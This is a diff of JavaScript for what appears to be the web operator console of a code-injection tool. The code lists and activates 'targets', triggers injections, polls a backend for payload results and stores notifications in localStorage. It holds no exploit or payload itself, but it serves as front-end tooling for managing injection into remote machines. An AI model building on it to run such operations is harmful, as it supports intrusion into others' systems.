+                            this.addOutputNotification(notification, false); // false = don't save to localStorage yet
+                        }
+                    });
+                    
+                    // Update badge count
+                    this.updateNotificationBadge();
+                }
+                
+                this.addConsoleOutput(`[SYSTEM] Restored ${this.notificationHistory.length} historical notifications`, 'success');
+                
+            } catch (error) {
+                console.error('[ERROR] Failed to restore notifications:', error);
+                this.addConsoleOutput('[ERROR] Failed to restore notifications from storage', 'error');
+                
+                // Clear corrupted data
+                localStorage.removeItem('notification_history');
+                localStorage.removeItem('active_notifications');
+                this.notificationHistory = [];
+            }
+        }
+        
+        /**
+         * Check if a notification is still valid (not expired)
+         * @param {Object} notification - The notification to check
+         * @returns {boolean} - True if valid, false if expired
+         */
+        isNotificationValid(notification) {
+            // Notifications are valid for 7 days
+            const MAX_AGE_DAYS = 7;
+            const maxAge = MAX_AGE_DAYS * 24 * 60 * 60 * 1000; // 7 days in milliseconds
+            
+            if (!notification.timestamp) return false;
+            
+            const notificationTime = new Date(notification.timestamp).getTime();
+            const currentTime = new Date().getTime();
+            
+            return (currentTime - notificationTime) < maxAge;
+        }
+        
+        /**
+         * Save active notifications to localStorage
+         */
+        saveActiveNotifications() {
+            try {
+                const activeNotifications = [];
+                
+                // Get all current notifications from the UI
+                const notificationElements = document.querySelectorAll('.output-item');
+                notificationElements.forEach(element => {
+                    const notification = {
+                        ID: element.getAttribute('data-update-id') || '',
+                        target_name: element.getAttribute('data-target-name') || '',
+                        payload_name: element.getAttribute('data-payload-name') || '',
+                        timestamp: element.getAttribute('data-timestamp') || new Date().toISOString(),
+                        status: element.classList.contains('read') ? 'viewed' : 'pending'
+                    };
+                    
+                    // Only save valid notifications
+                    if (this.isNotificationValid(notification)) {
+                        activeNotifications.push(notification);
+                    }
+                });
+                
+                // Save to localStorage
+                localStorage.setItem('active_notifications', JSON.stringify(activeNotifications));
+                
+                // Also save to history
+                this.saveNotificationHistory(activeNotifications);
+                
+                console.log('[SAVE] Saved', activeNotifications.length, 'active notifications');
+                
+            } catch (error) {
+                console.error('[ERROR] Failed to save active notifications:', error);
+            }
+        }
+        
+        /**
+         * Save notification to history
+         * @param {Array} notifications - Notifications to save to history
+         */
+        saveNotificationHistory(notifications) {
+            try {
+                // Add new notifications to history
+                notifications.forEach(notification => {
+                    // Check if this notification already exists in history
+                    const exists = this.notificationHistory.some(item => 
+                        item.ID === notification.ID || 
+                        (item.target_name === notification.target_name && 
+                         item.payload_name === notification.payload_name &&
+                         Math.abs(new Date(item.timestamp).getTime() - new Date(notification.timestamp).getTime()) < 60000) // Within 1 minute
+                    );
+                    
+                    if (!exists) {
+                        this.notificationHistory.push({
+                            ...notification,
+                            saved_at: new Date().toISOString()
+                        });
+                    }
+                });
+                
+                // Limit history size
+                const MAX_HISTORY = 200;
+                if (this.notificationHistory.length > MAX_HISTORY) {
+                    this.notificationHistory = this.notificationHistory.slice(-MAX_HISTORY);
+                }
+                
+                // Save to localStorage
+                localStorage.setItem('notification_history', JSON.stringify(this.notificationHistory));
+                
+            } catch (error) {
+                console.error('[ERROR] Failed to save notification history:', error);
+            }
+        }
+        
+        /**
+         * Clear all notifications from storage
+         */
+        clearAllNotificationsStorage() {
+            try {
+                localStorage.removeItem('active_notifications');
+                localStorage.removeItem('notification_history');
+                this.notificationHistory = [];
+                
+                // Also clear the UI
+                this.clearAllOutputNotifications();
+                
+                this.addConsoleOutput('[SYSTEM] Cleared all notifications from storage', 'success');
+                
+            } catch (error) {
+                console.error('[ERROR] Failed to clear notifications storage:', error);
+            }
+        }
+        
+        // ===== TARGET DROPDOWN POPULATION =====
+        populateTargetSelect() {
+            // Populate main target select
+            if (this.targetSelect && this.targets && Array.isArray(this.targets)) {
+                // Clear existing options except the first one
+                while (this.targetSelect.options.length > 1) {
+                    this.targetSelect.remove(1);
+                }
+                
+                // Add targets from backend
+                this.targets.forEach(target => {
+                    if (Array.isArray(target) && target.length >= 2) {
+                        const option = document.createElement('option');
+                        option.value = target[1]; // target[1] should be target_name
+                        option.textContent = target[1];
+                        this.targetSelect.appendChild(option);
+                    } else if (typeof target === 'string') {
+                        const option = document.createElement('option');
+                        option.value = target;
+                        option.textContent = target;
+                        this.targetSelect.appendChild(option);
+                    }
+                });
+            }
+            
+            // Also populate modal target select
+            if (this.modalTargetSelect && this.targets && Array.isArray(this.targets)) {
+                while (this.modalTargetSelect.options.length > 1) {
+                    this.modalTargetSelect.remove(1);
+                }
+                
+                this.targets.forEach(target => {
+                    if (Array.isArray(target) && target.length >= 2) {
+                        const option = document.createElement('option');
+                        option.value = target[1];
+                        option.textContent = target[1];
+                        this.modalTargetSelect.appendChild(option);
+                    } else if (typeof target === 'string') {
+                        const option = document.createElement('option');
+                        option.value = target;
+                        option.textContent = target;
+                        this.modalTargetSelect.appendChild(option);
+                    }
+                });
+            }
+        }
+        
+        // ===== ACTIVE TARGET FUNCTIONALITY =====
+        
+        async fetchInactiveTargets() {
+            try {
+                this.addConsoleOutput('[SYSTEM] Fetching inactive targets...', 'info');
+                
+                // Use GET method to fetch inactive targets
+                const response = await fetch('/code_injection/active_target', {
+                    method: 'GET',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    }
+                });
+                
+                if (!response.ok) {
+                    if (response.status === 401) {
+                        throw new Error('Unauthorized access. Please log in again.');
+                    }
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                const data = await response.json();
+                
+                if (data.inactive_payloads && Array.isArray(data.inactive_payloads)) {
+                    // Update the inactive_payloads variable
+                    window.inactive_payloads = data.inactive_payloads;
+                    
+                    this.addConsoleOutput(`[INFO] Found ${data.inactive_payloads.length} inactive targets`, 'success');
+                    
+                    // Update target select dropdown with inactive status
+                    this.updateTargetSelectWithStatus(data.inactive_payloads);
+                    
+                } else if (data.error) {
+                    this.addConsoleOutput(`[WARNING] ${data.error}`, 'warning');
+                }
+                
+            } catch (error) {
+                this.addConsoleOutput(`[ERROR] Failed to fetch inactive targets: ${error.message}`, 'error');
+            }
+        }
+        
+        updateTargetSelectWithStatus(inactiveTargets) {
+            if (!this.targetSelect) return;
+            
+            const options = this.targetSelect.querySelectorAll('option');
+            options.forEach(option => {
+                const targetName = option.value;
+                if (inactiveTargets.includes(targetName)) {
+                    // Mark as inactive
+                    option.textContent = option.textContent.replace(/ \[.*\]$/, '') + ' [INACTIVE]';
+                    option.style.color = '#ff0033';
+                    option.style.textShadow = '0 0 5px rgba(255, 0, 51, 0.5)';
+                } else {
+                    // Mark as active if not in inactive list
+                    option.textContent = option.textContent.replace(/ \[INACTIVE\]| \[ACTIVE\]/g, '');
+                    if (!option.textContent.includes('[ACTIVE]')) {
+                        option.textContent += ' [ACTIVE]';
+                        option.style.color = '#00ff41';
+                        option.style.textShadow = '0 0 5px rgba(0, 255, 65, 0.5)';
+                    }
+                }
+            });
+            
+            // Also update modal target select
+            if (this.modalTargetSelect) {
+                const modalOptions = this.modalTargetSelect.querySelectorAll('option');
+                modalOptions.forEach(option => {
+                    const targetName = option.value;
+                    if (inactiveTargets.includes(targetName)) {
+                        option.textContent = option.textContent.replace(/ \[.*\]$/, '') + ' [INACTIVE]';
+                    } else {
+                        option.textContent = option.textContent.replace(/ \[INACTIVE\]| \[ACTIVE\]/g, '');
+                        if (!option.textContent.includes('[ACTIVE]')) {
+                            option.textContent += ' [ACTIVE]';
+                        }
+                    }
+                });
+            }
+        }
+        
+        async activateTargetAPI(targetName) {
+            try {
+                this.addConsoleOutput(`[ACTIVATION] Attempting to activate target: ${targetName}`, 'warning');
+                
+                // Use POST method with JSON body as per your route
+                const response = await fetch('/code_injection/active_target', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        target_name: targetName
+                    })
+                });
+                
+                if (!response.ok) {
+                    if (response.status === 401) {
+                        throw new Error('Unauthorized access. Please log in again.');
+                    }
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                const result = await response.json();
+                
+                if (result.error) {
+                    throw new Error(result.error);
+                }
+                
+                this.addConsoleOutput(`[SUCCESS] ${result.message}`, 'success');
+                this.addConsoleOutput(`[SYSTEM] Target ${targetName} is now active for injection`, 'info');
+                
+                // Update UI
+                this.updateTargetStatus(targetName, 'active');
+                
+                // Refresh inactive targets list
+                setTimeout(() => this.fetchInactiveTargets(), 1000);
+                
+                return { success: true, message: result.message };
+                
+            } catch (error) {
+                this.addConsoleOutput(`[ERROR] Activation failed: ${error.message}`, 'error');
+                throw error;
+            }
+        }
+        
+        updateTargetStatus(targetName, status) {
+            // Update the target select to show status
+            const options = this.targetSelect.querySelectorAll('option');
+            options.forEach(option => {
+                if (option.value === targetName) {
+                    const statusText = status === 'active' ? ' [ACTIVE]' : ' [INACTIVE]';
+                    const statusColor = status === 'active' ? '#00ff41' : '#ff0033';
+                    option.textContent = option.textContent.replace(/ \[.*\]$/, '') + statusText;
+                    option.style.color = statusColor;
+                    option.style.textShadow = `0 0 5px ${statusColor}50`;
+                    
+                    // Add visual feedback
+                    if (status === 'active') {
+                        option.classList.add('activated');
+                        setTimeout(() => option.classList.remove('activated'), 2000);
+                    }
+                }
+            });
+            
+            // Also update modal target select
+            if (this.modalTargetSelect) {
+                const modalOptions = this.modalTargetSelect.querySelectorAll('option');
+                modalOptions.forEach(option => {
+                    if (option.value === targetName) {
+                        const statusText = status === 'active' ? ' [ACTIVE]' : ' [INACTIVE]';
+                        option.textContent = option.textContent.replace(/ \[.*\]$/, '') + statusText;
+                    }
+                });
+            }
+            
+            // Add console notification
+            this.addConsoleOutput(`[STATUS] Target ${targetName} marked as ${status.toUpperCase()}`, 'success');
+        }
+        
+        // ===== INACTIVE PAYLOADS MODAL FUNCTIONS =====
+        
+        open_list_of_inactive_pyload() {
+            if (!window.inactive_payloads || window.inactive_payloads.length === 0) {
+                this.addConsoleOutput('[INFO] No inactive targets found', 'info');
+                return;
+            }
+            
+            this.showInactivePayloadsModal();
+        }
+        
+        showInactivePayloadsModal() {
+            const modal = document.getElementById('inactivePayloadsModal');
+            const modalList = document.getElementById('inactivePayloadsList');
+            
+            // Clear previous content
+            if (modalList) modalList.innerHTML = '';
+            
+            // Add each inactive target as a list item
+            window.inactive_payloads.forEach(targetName => {
+                const payloadItem = document.createElement('div');
+                payloadItem.className = 'inactive-payload-item';
+                payloadItem.innerHTML = `
+                    <div class="payload-info">
+                        <span class="payload-name">${targetName}</span>
+                        <span class="payload-status">INACTIVE</span>
+                    </div>
+                    <button class="activate-btn" onclick="activateTarget('${targetName}')">
+                        <i class="fas fa-power-off"></i> ACTIVATE
+                    </button>
+                `;
+                modalList.appendChild(payloadItem);
+            });
+            
+            // Update modal title with count
+            const titleElement = document.getElementById('inactivePayloadsTitle');
+            if (titleElement) {
+                titleElement.innerHTML = 
+                    `<i class="fas fa-skull-crossbones"></i> INACTIVE TARGETS (${window.inactive_payloads.length})`;
+            }
+            
+            // Show modal
+            if (modal) modal.style.display = 'flex';
+        }
+        
+        closeInactivePayloadsModal() {
+            const modal = document.getElementById('inactivePayloadsModal');
+            if (modal) modal.style.display = 'none';
+        }
+        
+        async activateTarget(targetName) {
+            try {
+                // Show loading state
+                const buttons = document.querySelectorAll(`[onclick*="activateTarget('${targetName}')"]`);
+                buttons.forEach(btn => {
+                    const originalHTML = btn.innerHTML;
+                    btn.innerHTML = '<div class="loading" style="display: inline-block; width: 12px; height: 12px; margin-right: 5px;"></div> ACTIVATING...';
+                    btn.disabled = true;
+                    btn.classList.add('activating');
+                    
+                    // Store original content for later restoration
+                    btn.dataset.originalHTML = originalHTML;
+                });
+                
+                // Use the class method to activate target
+                await this.activateTargetAPI(targetName);
+                
+                // Success handling - Update button to show success
+                buttons.forEach(btn => {
+                    btn.innerHTML = '<i class="fas fa-check-circle"></i> ACTIVATED';
+                    btn.classList.remove('activating');
+                    btn.classList.add('activated');
+                    setTimeout(() => {
+                        // Remove the item from the list after success
+                        const payloadItem = btn.closest('.inactive-payload-item');
+                        if (payloadItem) {
+                            payloadItem.style.opacity = '0.5';
+                            payloadItem.style.transform = 'translateX(-100%)';
+                            setTimeout(() => {
+                                payloadItem.remove();
+                                
+                                // Update count in title
+                                const remainingItems = document.querySelectorAll('.inactive-payload-item').length;
+                                const titleElement = document.getElementById('inactivePayloadsTitle');
+                                if (titleElement) {
+                                    titleElement.innerHTML = 
+                                        `<i class="fas fa-skull-crossbones"></i> INACTIVE TARGETS (${remainingItems})`;
+                                }
+                                
+                                // Close modal if no items left
+                                if (remainingItems === 0) {
+                                    setTimeout(() => this.closeInactivePayloadsModal(), 500);
+                                }
+                            }, 300);
+                        }
+                    }, 1500);
+                });
+                
+            } catch (error) {
+                this.addConsoleOutput(`[ERROR] Failed to activate ${targetName}: ${error.message}`, 'error');
+                
+                // Restore buttons to original state
+                const buttons = document.querySelectorAll(`[onclick*="activateTarget('${targetName}')"]`);
+                buttons.forEach(btn => {
+                    if (btn.dataset.originalHTML) {
+                        btn.innerHTML = btn.dataset.originalHTML;
+                    } else {
+                        btn.innerHTML = '<i class="fas fa-power-off"></i> ACTIVATE';
+                    }
+                    btn.disabled = false;
+                    btn.classList.remove('activating');
+                    
+                    // Add error styling
+                    btn.classList.add('error-btn');
+                    setTimeout(() => {
+                        btn.classList.remove('error-btn');
+                    }, 2000);
+                });
+            }
+        }
+        
+        async refreshInactivePayloads() {
+            try {
+                // Show loading in modal
+                const refreshBtn = document.getElementById('refreshInactiveBtn');
+                const originalText = refreshBtn ? refreshBtn.innerHTML : '';
+                if (refreshBtn) {
+                    refreshBtn.innerHTML = '<div class="loading" style="display: inline-block; width: 12px; height: 12px; margin-right: 5px;"></div> REFRESHING...';
+                    refreshBtn.disabled = true;
+                }
+                
+                // Refresh the list
+                await this.fetchInactiveTargets();
+                this.showInactivePayloadsModal();
+                
+                this.addConsoleOutput('[INFO] Inactive targets list refreshed', 'success');
+                
+                // Restore button
+                if (refreshBtn) {
+                    setTimeout(() => {
+                        refreshBtn.innerHTML = originalText;
+                        refreshBtn.disabled = false;
+                    }, 500);
+                }
+                
+            } catch (error) {
+                this.addConsoleOutput(`[ERROR] Refresh failed: ${error.message}`, 'error');
+                
+                // Restore button on error
+                const refreshBtn = document.getElementById('refreshInactiveBtn');
+                if (refreshBtn) {
+                    refreshBtn.innerHTML = '<i class="fas fa-sync-alt"></i> REFRESH';
+                    refreshBtn.disabled = false;
+                }
+            }
+        }
+        
+        // ===== EXISTING CODE EDITOR FUNCTIONALITY =====
+        
+        initMatrixOverlay() {
+            const canvas = document.getElementById('matrixOverlay');
+            if (!canvas) return;
+            
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = canvas.offsetWidth;
+            canvas.height = canvas.offsetHeight;
+            
+            const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
+            const charArray = chars.split("");
+            const fontSize = 10;
+            const columns = canvas.width / fontSize;
+            const drops = [];
+            
+            for (let x = 0; x < columns; x++) {
+                drops[x] = Math.random() * canvas.height;
+            }
+            
+            const drawMatrix = () => {
+                ctx.fillStyle = "rgba(10, 10, 10, 0.04)";
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                ctx.fillStyle = "#00ff41";
+                ctx.font = `${fontSize}px 'JetBrains Mono'`;
+                
+                for (let i = 0; i < drops.length; i++) {
+                    const text = charArray[Math.floor(Math.random() * charArray.length)];
+                    const opacity = Math.random() * 0.5 + 0.3;
+                    ctx.fillStyle = `rgba(0, 255, 65, ${opacity})`;
+                    ctx.fillText(text, i * fontSize, drops[i]);
+                    
+                    if (drops[i] > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    
+                    drops[i] += fontSize;
+                }
+            };
+            
+            setInterval(drawMatrix, 50);
+            
+            window.addEventListener('resize', () => {
+                canvas.width = canvas.offsetWidth;
+                canvas.height = canvas.offsetHeight;
+            });
+        }
+        
+        setupEventListeners() {
+            // Code editor events
+            if (this.editor) {
+                this.editor.addEventListener('input', () => {
+                    this.updateLineNumbers();
+                    this.updateCursorPosition();
+                    this.updateCharCount();
+                    this.saveToUndoStack();
+                    
+                    // Auto-save if file exists (optional)
+                    if (this.currentFile && this.autoSaveEnabled) {
+                        this.autoSaveDebounce();
+                    }
+                });
+                
+                // Add auto-save debounce function
+                this.autoSaveDebounce = this.debounce(() => {
+                    this.saveCurrentFile().catch(() => {
+                        // Silent fail for auto-save
+                    });
+                }, 3000);
+                
+                this.editor.addEventListener('keydown', (e) => {
+                    // Tab key support (4 spaces)
+                    if (e.key === 'Tab') {
+                        e.preventDefault();
+                        this.insertTab();
+                        return;
+                    }
+                    
+                    // Ctrl/Cmd + S to save
+                    if ((e.ctrlKey || e.metaKey) && e.key === 's') {
+                        e.preventDefault();
+                        this.saveCurrentFile();
+                    }
+                    
+                    // Ctrl/Cmd + E to encrypt
+                    if ((e.ctrlKey || e.metaKey) && e.key === 'e') {
+                        e.preventDefault();
+                        this.encryptFile();
+                    }
+                    
+                    // Ctrl/Cmd + D to decode
+                    if ((e.ctrlKey || e.metaKey) && e.key === 'd') {
+                        e.preventDefault();
+                        this.decodeFile();
+                    }
+                    
+                    // Ctrl/Cmd + Z to undo
+                    if ((e.ctrlKey || e.metaKey) && !e.shiftKey && e.key === 'z') {
+                        e.preventDefault();
+                        this.undo();
+                    }
+                    
+                    // Ctrl/Cmd + Shift + Z or Ctrl/Cmd + Y to redo
+                    if (((e.ctrlKey || e.metaKey) && e.shiftKey && e.key === 'z') || 
+                        ((e.ctrlKey || e.metaKey) && e.key === 'y')) {
+                        e.preventDefault();
+                        this.redo();
+                    }
+                    
+                    // Ctrl/Cmd + I to inject
+                    if ((e.ctrlKey || e.metaKey) && e.key === 'i') {
+                        e.preventDefault();
+                        this.startInjection();
+                    }
+                    
+                    // Ctrl/Cmd + A to show inactive targets
+                    if ((e.ctrlKey || e.metaKey) && e.key === 'a') {
+                        e.preventDefault();
+                        this.open_list_of_inactive_pyload();
+                    }
+                    
+                    // Ctrl/Cmd + R to restore notifications (debug)
+                    if ((e.ctrlKey || e.metaKey) && e.key === 'r') {
+                        e.preventDefault();
+                        this.restoreNotifications();
+                    }
+                });
+                
+                this.editor.addEventListener('click', () => {
+                    this.updateCursorPosition();
+                });
+                
+                this.editor.addEventListener('scroll', () => {
+                    if (this.lineNumbers) {
+                        this.lineNumbers.scrollTop = this.editor.scrollTop;
+                    }
+                });
+                
+                this.editor.addEventListener('keyup', () => {
+                    this.updateCursorPosition();
+                });
+            }
+            
+            // Target select event listener
+            if (this.targetSelect) {
+                this.targetSelect.addEventListener('change', () => {
+                    this.targetSelect.classList.remove('error');
+                });
+            }
+            
+            // Control buttons
+            const injectBtn = document.getElementById('btn-inject');
+            const saveBtn = document.getElementById('btn-save');
+            const inactiveTargetsBtn = document.getElementById('validateBtn'); // Changed from btn-inactive-targets
+            
+            if (injectBtn) injectBtn.addEventListener('click', () => this.startInjection());
+            if (saveBtn) saveBtn.addEventListener('click', () => this.saveCurrentFile());
+            if (inactiveTargetsBtn) inactiveTargetsBtn.addEventListener('click', () => this.open_list_of_inactive_pyload());
+            
+            // Save notifications before page unload
+            window.addEventListener('beforeunload', () => {
+                this.saveActiveNotifications();
+            });
+            
+            // Save notifications periodically (every 30 seconds)
+            setInterval(() => {
+                this.saveActiveNotifications();
+            }, 30000);
+        }
+        
+        debounce(func, wait) {
+            let timeout;
+            return function executedFunction(...args) {
+                const later = () => {
+                    clearTimeout(timeout);
+                    func(...args);
+                };
+                clearTimeout(timeout);
+                timeout = setTimeout(later, wait);
+            };
+        }
+        
+        insertTab() {
+            if (!this.editor) return;
+            
+            const start = this.editor.selectionStart;
+            const end = this.editor.selectionEnd;
+            const text = this.editor.value;
+            
+            // Insert 4 spaces at cursor position
+            this.editor.value = text.substring(0, start) + '    ' + text.substring(end);
+            
+            // Move cursor to after the inserted tab
+            this.editor.selectionStart = this.editor.selectionEnd = start + 4;
+            
+            // Trigger input event
+            this.editor.dispatchEvent(new Event('input'));
+        }
+        
+        // === UPDATE CHECKING ===
+        startUpdateChecking() {
+            // Check for updates every 5 seconds
+            this.updateCheckInterval = setInterval(() => this.checkForUpdates(), 5000);
+        }
+        
+        // === ENHANCED UPDATE CHECKING WITH PERSISTENT NOTIFICATIONS ===
+        async checkForUpdates() {
+            try {
+                // Fetch recent injection activities
+                const response = await fetch('/code_injection/check_update');
+                if (!response.ok) {
+                    this.addConsoleOutput(`[UPDATE] Check failed: HTTP ${response.status}`, 'warning');
+                    return;
+                }
+                
+                const data = await response.json();
+                
+                // Check if data.status is 'updated' (not 'update')
+                if (data.status === 'updated') {
+                    // Handle updates - your backend returns data in 'instraction'
+                    if (data.instraction) {
+                        let update = null;
+                        
+                        // Check if instraction.info exists and is an array/tuple
+                        if (data.instraction.info && Array.isArray(data.instraction.info)) {
+                            const [ID, target_name, payload_name] = data.instraction.info;
+                            
+                            // Create update object from the tuple
+                            update = {
+                                ID: ID,
+                                target_name: target_name,
+                                payload_name: payload_name,
+                                timestamp: new Date().toISOString(),
+                                status: 'pending'
+                            };
+                            
+                        } 
+                        // If instraction.info is not an array but has properties
+                        else if (data.instraction.ID || data.instraction.target_name) {
+                            // Data is already in the right format
+                            update = {
+                                ID: data.instraction.ID || '',
+                                target_name: data.instraction.target_name || 'Unknown Target',
+                                payload_name: data.instraction.payload_name || 'Unknown Payload',
+                                timestamp: data.instraction.timestamp || new Date().toISOString(),
+                                status: data.instraction.status || 'pending'
+                            };
+                        }
+                        // Handle case where info might be a string or other format
+                        else if (typeof data.instraction === 'string') {
+                            try {
+                                const parsed = JSON.parse(data.instraction);
+                                if (parsed.info && Array.isArray(parsed.info)) {
+                                    const [ID, target_name, payload_name] = parsed.info;
+                                    update = {
+                                        ID: ID,
+                                        target_name: target_name,
+                                        payload_name: payload_name,
+                                        timestamp: new Date().toISOString(),
+                                        status: 'pending'
+                                    };
+                                }
+                            } catch (e) {
+                                console.log('Could not parse instraction string:', data.instraction);
+                            }
+                        }
+                        
+                        // Check if we have a valid update
+                        if (update) {
+                            // Check if this payload has already been notified
+                            if (!this.isPayloadAlreadyNotified(update)) {
+                                this.addConsoleOutput(`[UPDATE] New payload update for ${update.target_name}`, 'info');
+                                this.addOutputNotification(update);
+                                this.saveNotifiedPayload(update);
+                                
+                                // Save to storage immediately
+                                this.saveActiveNotifications();
+                            } else {
+                                console.log('[UPDATE] Payload already notified, skipping:', update.ID);
+                            }
+                        } else {
+                            this.addConsoleOutput('[UPDATE] Received update with unknown format', 'warning');
+                        }
+                    } else {
+                        this.addConsoleOutput('[UPDATE] No instraction data in response', 'warning');
+                    }
+                } else if (data.status === 'notYet') {
+                    // No updates available - silent check
+                } else if (data.error) {
+                    this.addConsoleOutput(`[UPDATE ERROR] ${data.error}`, 'error');
+                } else {
+                    this.addConsoleOutput(`[UPDATE] Unknown response status: ${data.status}`, 'warning');
+                }
+                
+            } catch (error) {
+                console.error('Update check failed:', error);
+                // Don't show error for network issues to avoid spam
+            }
+        }
+        
+        // ===== PAYLOAD NOTIFICATION DEDUPLICATION SYSTEM =====
+        
+        /**
+         * Check if payload has already been notified to the user
+         * @param {Object} payload - The payload object containing ID and other info
+         * @returns {boolean} - True if already notified, false otherwise
+         */
+        isPayloadAlreadyNotified(payload) {
+            // Check against notification history
+            if (payload.ID) {
+                return this.notificationHistory.some(item => item.ID === payload.ID);
+            }
+            
+            // Fallback: check by combination of target_name and payload_name if no ID
+            if (payload.target_name && payload.payload_name) {
+                return this.notificationHistory.some(item => 
+                    item.target_name === payload.target_name && 
+                    item.payload_name === payload.payload_name &&
+                    Math.abs(new Date(item.timestamp).getTime() - new Date(payload.timestamp).getTime()) < 60000 // Within 1 minute
+                );
+            }
+            
+            // If no unique identifiers, assume it's new
+            return false;
+        }
+        
+        /**
+         * Save notified payload to prevent duplicate notifications
+         * @param {Object} payload - The payload object to save
+         */
+        saveNotifiedPayload(payload) {
+            try {
+                // Add to notification history
+                const exists = this.notificationHistory.some(item => 
+                    item.ID === payload.ID || 
+                    (item.target_name === payload.target_name && 
+                     item.payload_name === payload.payload_name &&
+                     Math.abs(new Date(item.timestamp).getTime() - new Date(payload.timestamp).getTime()) < 60000)
+                );
+                
+                if (!exists) {
+                    this.notificationHistory.push({
+                        ...payload,
+                        saved_at: new Date().toISOString()
+                    });
+                    
+                    // Limit history size
+                    const MAX_HISTORY = 200;
+                    if (this.notificationHistory.length > MAX_HISTORY) {
+                        this.notificationHistory = this.notificationHistory.slice(-MAX_HISTORY);
+                    }
+                    
+                    // Save to localStorage
+                    localStorage.setItem('notification_history', JSON.stringify(this.notificationHistory));
+                }
+                
+            } catch (error) {
+                console.error('[ERROR] Failed to save notified payload:', error);
+            }
+        }
+        
+        /**
+         * View the list of saved notified payloads (for debugging)
+         */
+        viewSavedNotifiedPayloads() {
+            console.log('[DEBUG] Notification history:', this.notificationHistory);
+            
+            // Display in console
+            this.addConsoleOutput(`[DEBUG] Total saved notifications: ${this.notificationHistory.length}`, 'info');
+            
+            if (this.notificationHistory.length > 0) {
+                this.notificationHistory.forEach((payload, index) => {
+                    this.addConsoleOutput(
+                        `[DEBUG] ${index + 1}. ID: ${payload.ID}, Target: ${payload.target_name}, Time: ${new Date(payload.timestamp).toLocaleString()}`,
+                        'info'
+                    );
+                });
+            } else {
+                this.addConsoleOutput('[DEBUG] No saved notifications found', 'info');
+            }
+        }
+        
+        // ===== OUTPUT NOTIFICATION SECTION =====
+        
+        /**
+         * Add a new output notification to the list
+         * @param {Object} update - The update object containing injection details
+         * @param {boolean} saveToStorage - Whether to save to storage immediately
+         */
+        addOutputNotification(update, saveToStorage = true) {
+            if (!this.outputList) {
+                console.error('Output list element not found');
+                return;
+            }
+            
+            // Validate update object
+            if (!update || (!update.ID && !update.target_name)) {
+                console.error('Invalid update object:', update);
+                return;
+            }
+            
+            // Check for duplicates in the UI
+            const existingNotifications = this.getExistingNotifications();
+            const isDuplicate = this.checkIfNotificationExists(existingNotifications, update);
+            
+            if (isDuplicate) {
+                console.log('[NOTIFICATION] Duplicate notification skipped:', update.ID || update.target_name);
+                return;
+            }
+            
+            // Create a unique ID for this notification
+            const notificationId = `output-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
+            
+            const outputItem = document.createElement('div');
+            outputItem.className = 'output-item';
+            outputItem.id = notificationId;
+            outputItem.setAttribute('data-update-id', update.ID || '');
+            outputItem.setAttribute('data-target-name', update.target_name || '');
+            outputItem.setAttribute('data-payload-name', update.payload_name || '');
+            outputItem.setAttribute('data-timestamp', update.timestamp || new Date().toISOString());
+            
+            if (update.status === 'viewed') {
+                outputItem.classList.add('read');
+            }
+            
+            // Format timestamp for display
+            const formattedTime = this.formatTimestamp(update.timestamp);
+            
+            // Escape HTML in text to prevent XSS
+            const targetName = this.escapeHtml(update.target_name || 'Unknown Target');
+            const payloadName = this.escapeHtml(update.payload_name || 'Unknown Payload');
+            
+            outputItem.innerHTML = `
+                <div class="output-item-header">
+                    <div class="output-target-info">
+                        <span class="target-name">
+                            <i class="fas fa-crosshairs"></i> ${targetName}
+                        </span>
+                        <span class="payload-name">
+                            <i class="fas fa-code"></i> ${payloadName}
+                        </span>
+                    </div>
+                    <div class="output-timestamp">
+                        <i class="far fa-clock"></i> ${formattedTime}
+                    </div>
+                </div>
+                <div class="output-item-body">
+                    <div class="output-status">
+                        <span class="status-badge status-${update.status || 'pending'}">
+                            ${(update.status || 'PENDING').toUpperCase()}
+                        </span>
+                    </div>
+                    <div class="output-actions">
+                        <button class="show-output-btn" onclick="codeEditor.showOutputDetails('${update.ID || ''}', '${targetName.replace(/'/g, "\\'")}', '${payloadName.replace(/'/g, "\\'")}')">
+                            <i class="fas fa-eye"></i> VIEW OUTPUT
+                        </button>
+                        <button class="dismiss-btn" onclick="codeEditor.dismissOutputNotification('${notificationId}')">
+                            <i class="fas fa-times"></i>
+                        </button>
+                    </div>
+                </div>
+            `;
+            
+            // Add animation for new notification
+            outputItem.style.animation = 'slideInRight 0.3s ease-out';
+            
+            // Add to the top of the list
+            if (this.outputList.firstChild) {
+                this.outputList.insertBefore(outputItem, this.outputList.firstChild);
+            } else {
+                this.outputList.appendChild(outputItem);
+            }
+            
+            // Show notification count badge
+            this.updateNotificationBadge();
+            
+            // Auto-dismiss after 1 hour if not viewed (increased from 30 seconds)
+            setTimeout(() => {
+                if (document.getElementById(notificationId) && !outputItem.classList.contains('read')) {
+                    this.dismissOutputNotification(notificationId);
+                }
+            }, 3600000); // 1 hour
+            
+            // Also ensure the output panel is visible
+            this.ensureOutputPanelVisible();
+            
+            // Save to storage if requested
+            if (saveToStorage) {
+                setTimeout(() => this.saveActiveNotifications(), 1000);
+            }
+        }
+        
+        /**
+         * Get all existing notifications from the UI
+         * @returns {Array} Array of existing notification elements
+         */
+        getExistingNotifications() {
+            return document.querySelectorAll('.output-item[data-update-id]');
+        }
+        
+        /**
+         * Check if a notification already exists in the UI
+         * @param {NodeList} existingNotifications - Existing notification elements
+         * @param {Object} update - New update object to check
+         * @returns {boolean} True if duplicate exists
+         */
+        checkIfNotificationExists(existingNotifications, update) {
+            for (const item of existingNotifications) {
+                const existingId = item.getAttribute('data-update-id');
+                const existingTarget = item.getAttribute('data-target-name');
+                const existingPayload = item.getAttribute('data-payload-name');
+                
+                // Check by ID first (most reliable)
+                if (existingId && update.ID && existingId === update.ID) {
+                    return true;
+                }
+                
+                // Fallback: check by target and payload name
+                if (!update.ID && existingTarget && existingPayload) {
+                    if (existingTarget === update.target_name && existingPayload === update.payload_name) {
+                        return true;
+                    }
+                }
+            }
+            return false;
+        }
+        
+        /**
+         * Format timestamp for display
+         * @param {string} timestamp - ISO timestamp string
+         * @returns {string} Formatted time string
+         */
